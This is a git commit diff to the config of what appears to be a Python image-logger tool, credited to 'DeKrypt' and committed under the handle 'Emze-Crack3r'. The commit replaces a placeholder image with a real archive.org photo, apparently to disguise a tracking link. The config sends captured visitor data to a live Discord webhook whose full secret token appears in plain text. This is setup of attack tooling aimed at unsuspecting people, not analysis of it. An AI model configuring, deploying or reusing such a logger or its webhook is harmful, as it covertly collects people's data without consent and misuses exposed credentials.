5ef196420473cae0c99ec2962983457d0224afd9
Emze-Crack3r <emzestate25@gmail.com>
2025-03-25 10:19:16 +0800

    Update iimage.py

--- api/iimage.py
+++ api/iimage.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1353915568369176637/tq95xzyM-AX0vRmv58JMVEcb03D8tfoDkx87AGWS0zSTC8zs54hramTFw2f8cSwiE0IG",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://ia802303.us.archive.org/4/items/kabute-live-at-the-cozy-cove-jose-at-melodiya/338133668_526937099618583_2426961185260775926_n.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
